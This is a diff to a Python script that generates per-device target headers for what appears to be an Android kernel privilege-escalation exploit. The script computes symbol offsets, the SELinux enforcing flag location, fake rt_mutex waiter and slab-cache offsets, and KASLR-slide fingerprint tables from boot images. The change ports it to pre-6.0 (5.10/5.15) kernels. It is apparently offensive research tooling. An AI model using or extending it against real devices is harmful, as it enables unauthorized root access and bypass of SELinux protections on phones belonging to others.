@@ -22,6 +22,13 @@ Sources per value:
   P0_PHYS_OFFSET/P0_KERNEL_PHYS_LOAD   xbl_config FDT memory map or sboot
   p0_fingerprint.h                     raw bytes at PROBE_OFFSET - slide
 
+Pre-6.0 kernels (5.10/5.15): clang LTO mangles local symbols with .llvm.
+suffixes (resolved automatically), there is no struct slab (slab_cache is
+found inside struct page's anonymous union), and 16K-aligned KASLR slides
+require 0x4000-step fingerprint rows; MM_STRUCT_SZ and the kmalloc cache
+layout (KMALLOC_CGROUP_TYPE/KMALLOC_CACHE_TYPES) are emitted for the
+5.15-style 3-cache layout.
+
 Usage:
   generate_target.py --boot boot.img --profile P --fingerprint F \
       (--xbl-config xbl_config.elf | --sboot sboot.bin | --kernel-phys A)
@@ -88,6 +95,31 @@ def recover_symbols(elf: Path) -> dict:
     return sym
 
 
+def has_symbol(sym: dict, name: str) -> bool:
+    if name in sym:
+        return True
+    pref = name + '.llvm.'
+    return any(k.startswith(pref) for k in sym)
+
+
+def resolve_symbol(sym: dict, name: str) -> int:
+    """Resolve a symbol, tolerating clang LTO local suffixes (.llvm.<id>).
+
+    5.15 kernels built with LTO expose static functions as e.g.
+    configfs_read_iter.llvm.8090890824163915520; match the bare name
+    exactly first, then require a unique .llvm. variant.
+    """
+    if name in sym:
+        return sym[name]
+    pref = name + '.llvm.'
+    hits = [v for k, v in sym.items() if k.startswith(pref)]
+    if len(hits) == 1:
+        return hits[0]
+    if not hits:
+        raise KeyError(name)
+    raise SystemExit(f"ambiguous symbol {name}: {len(hits)} .llvm. variants")
+
+
 def extract_btf(kernel: bytes, out: Path):
     cand = []
     cursor = 0
@@ -138,8 +170,58 @@ def struct_size(raw: str, name: str):
     return int(m.group(1))
 
 
-def worker_caller_off(elf: Path, base: int) -> int:
-    dis = run(['llvm-objdump', '--disassemble-symbols=worker_thread', str(elf)])
+def parse_btf_udts(raw: str) -> dict:
+    """Parse raw BTF dump into {type_id: ('STRUCT'|'UNION', [(name, tid,
+    bit_offset), ...])} for nested anonymous-type walks."""
+    udts = {}
+    cur = None
+    for ln in raw.splitlines():
+        m = re.match(r"^\[(\d+)\] (STRUCT|UNION) '([^']*)' size=\d+ vlen=\d+",
+                     ln)
+        if m:
+            cur = int(m.group(1))
+            udts[cur] = (m.group(2), [])
+            continue
+        m = re.match(r"^\s+'([^']*)' type_id=(\d+) bits_offset=(\d+)", ln)
+        if m and cur is not None:
+            udts[cur][1].append((m.group(1), int(m.group(2)),
+                                 int(m.group(3))))
+    return udts
+
+
+def nested_btf_member(raw: str, root: str, member: str):
+    """Find a member buried in anonymous unions/structs, e.g.
+    struct page -> (anon) -> (anon) -> slab_cache. Returns byte offset
+    within the root type, or None. Only anonymous members are descended
+    into, so named members elsewhere never shadow the walk."""
+    udts = parse_btf_udts(raw)
+    start = None
+    for ln in raw.splitlines():
+        m = re.match(r"^\[(\d+)\] STRUCT '(%s)' size=" % re.escape(root), ln)
+        if m:
+            start = int(m.group(1))
+            break
+    if start is None:
+        return None
+    seen = set()
+    stack = [(start, 0)]
+    while stack:
+        tid, base = stack.pop()
+        if tid in seen or tid not in udts:
+            continue
+        seen.add(tid)
+        kind, mems = udts[tid]
+        for name, m_tid, boff in mems:
+            if name == member:
+                return base + boff // 8
+            if name == '(anon)':
+                stack.append((m_tid, base + boff // 8))
+    return None
+
+
+def worker_caller_off(elf: Path, base: int, worker_name: str = 'worker_thread') -> int:
+    dis = run(['llvm-objdump', f'--disassemble-symbols={worker_name}',
+               str(elf)])
     succ = [int(a, 16) + 4 for a in re.findall(
         r'^([0-9a-f]+):\s+[0-9a-f]+\s+bl\s+0x[0-9a-f]+\s+<schedule>$', dis,
         re.M)]
@@ -328,10 +410,10 @@ def recover_xbl_profile(path: Path, image_size: int) -> XblProfile:
 
 
 def gen_fingerprint(kernel: bytes, probe: int, out: Path, desc: str,
-                    inverse: bool = False):
+                    inverse: bool = False, step: int = 0x10000):
     page_offsets = [0x000, 0x200, 0x400, 0x600, 0x800, 0xA00, 0xC00, 0xE00]
     rows = []
-    for slide in range(0, 0x200000, 0x10000):
+    for slide in range(0, probe + step, step):
         src = slide if inverse else probe - slide
         if src < 0:
             raise SystemExit(f"slide 0x{slide:x} exceeds probe 0x{probe:x}")
@@ -390,6 +472,7 @@ TEMPLATE = r"""#ifndef OFFSET_H
 #define P0_PHYS_OFFSET __PHYS_OFF__
 #define P0_KERNEL_PHYS_LOAD __KERNEL_PHYS__
 #define SKB_DATA_DELTA __SKB_DELTA__
+__LEGACY_KERNEL__
 
 #define SLIDE_FAKE_WAITER_PRIO 0
 #define SLIDE_WAITER_WAKE_STATE 0
@@ -663,6 +746,10 @@ def main():
     release, build, full_version = parse_version(kernel)
     print(f"kernel release:  {release}")
     print(f"build id:        {build}")
+    vmaj, vmin = (int(x) for x in re.match(r'^(\d+)\.(\d+)', release).groups())
+    legacy = (vmaj, vmin) < (6, 0)
+    print(f"kernel family:   {vmaj}.{vmin} "
+          f"({'legacy (<6.0)' if legacy else 'modern (>=6.0)'})")
     profile = args.profile
     fingerprint = args.fingerprint
     if build is None:
@@ -685,7 +772,12 @@ def main():
         raise SystemExit("no _text symbol in recovered ELF")
     base = sym['_text']
     print(f"KIMAGE_TEXT_BASE: 0x{base:x}")
-    off = lambda n: sym[n] - base
+    off = lambda n: resolve_symbol(sym, n) - base
+    worker_name = 'worker_thread'
+    for cand in sym:
+        if cand == worker_name or cand.startswith(worker_name + '.llvm.'):
+            worker_name = cand
+            break
 
     btf = work / 'vmlinux.btf'
     bstart, bend = extract_btf(kernel, btf)
@@ -746,13 +838,29 @@ def main():
     slab = structs.get('slab', {})
     slab_cache_off = slab.get('slab_cache', args.slab_cache_off)
     if slab_cache_off is None:
-        slab_cache_off = 0x08
-        print("slab cache:      struct slab has no slab_cache member; "
-              "falling back to 0x08 (override with --slab-cache-off)")
+        # < 6.0 kernels have no struct slab: slab_cache lives inside
+        # struct page's anonymous slab union.
+        page_cache = nested_btf_member(btf_raw, 'page', 'slab_cache')
+        if page_cache is not None:
+            slab_cache_off = page_cache
+            print(f"slab cache:      struct page.slab_cache (nested) = "
+                  f"0x{slab_cache_off:x}")
+        else:
+            slab_cache_off = 0x08
+            print("slab cache:      no struct slab.slab_cache / "
+                  "struct page.slab_cache; falling back to 0x08 "
+                  "(override with --slab-cache-off)")
     layout = ('node-based' if 'tree' in waiter and wnode else 'flat')
     print(f"rt_mutex_waiter: {layout}, "
           f"size 0x{struct_size(btf_raw, 'rt_mutex_waiter'):x}")
     print(f"slab cache:      struct slab.slab_cache = 0x{slab_cache_off:x}")
+
+    mm_struct_sz = None
+    if legacy:
+        mm_size = struct_size(btf_raw, 'mm_struct')
+        mm_struct_sz = 1 << (mm_size - 1).bit_length()
+        print(f"mm_struct:       BTF size 0x{mm_size:x} -> "
+              f"MM_STRUCT_SZ 0x{mm_struct_sz:x} (slab object)")
 
     event_index = (sym['__event_sched_blocked_reason'] -
                    sym['__start_ftrace_events']) // 8
@@ -764,8 +872,8 @@ def main():
         print(f"trace event:     base {trace_base} + "
               f"event_index={event_index} => {event_id}")
 
-    worker_off = worker_caller_off(elf, base)
-    print(f"worker caller:   worker_thread schedule successor - base = "
+    worker_off = worker_caller_off(elf, base, worker_name)
+    print(f"worker caller:   {worker_name} schedule successor - base = "
           f"0x{worker_off:x}")
 
     nfulnl_name = kernel.find(b'nfnetlink_log\x00')
@@ -826,7 +934,7 @@ def main():
     print(f"P0_PHYS_OFFSET:     0x{phys_offset:x}")
     print(f"P0_KERNEL_PHYS_LOAD: 0x{kernel_phys:x}")
 
-    splice = ('filemap_splice_read' if 'filemap_splice_read' in sym
+    splice = ('filemap_splice_read' if has_symbol(sym, 'filemap_splice_read')
               else 'generic_file_splice_read')
     selinux_enforcing = off('selinux_state') + f('selinux_state', 'enforcing')
 
@@ -857,7 +965,7 @@ def main():
         'SELINUX': f'0x{selinux_enforcing:08x}',
         'SYSCTL_BOOTID': f'0x{off("sysctl_bootid"):08x}',
         'ASHMEM_MISC': ('0x%08x' %
-                        off('ashmem_misc' if 'ashmem_misc' in sym
+                        off('ashmem_misc' if has_symbol(sym, 'ashmem_misc')
                             else 'ashmem_miscs')),
         'NFULNL_NAME': f'0x{nfulnl_name:08x}',
         'NFULNL_OBJ': f'0x{logger_obj:08x}',
@@ -905,6 +1013,11 @@ def main():
         'POOL_NRIDLE': f'0x{f("worker_pool", "nr_idle"):02x}',
         'WQ_DFL_PWQ': f'0x{f("workqueue_struct", "dfl_pwq"):02x}',
         'SKB_DELTA': f'({args.skb_data_delta:#x}LL)',
+        'LEGACY_KERNEL': ((
+            "#define MM_STRUCT_SZ 0x%x\n"
+            "#define KMALLOC_CGROUP_TYPE 1\n"
+            "#define KMALLOC_CACHE_TYPES 3") % mm_struct_sz
+            if legacy else ""),
         'PSELECT_SHIFT': str(args.pselect_word_shift),
         'PSELECT_TIMEOUT': f'{args.pselect_timeout_nsec}L',
         'BANK_SLOTS': str(args.bank_slots),
@@ -927,11 +1040,12 @@ def main():
     target_out.write_text(target_h)
 
     fp_out = out / 'p0_fingerprint.h'
+    fp_step = 0x4000 if legacy else 0x10000
     gen_fingerprint(kernel, args.probe_offset, fp_out,
                     f"{args.model or build} {build}",
-                    inverse=args.inverse_slide)
-    print(f"p0 fingerprint:  32 rows x 8 words at probe "
-          f"0x{args.probe_offset:x}")
+                    inverse=args.inverse_slide, step=fp_step)
+    print(f"p0 fingerprint:  {args.probe_offset // fp_step + 1} rows x 8 words "
+          f"at probe 0x{args.probe_offset:x} (slide step 0x{fp_step:x})")
     print(f"wrote {target_out}")
     print(f"wrote {fp_out}")
 
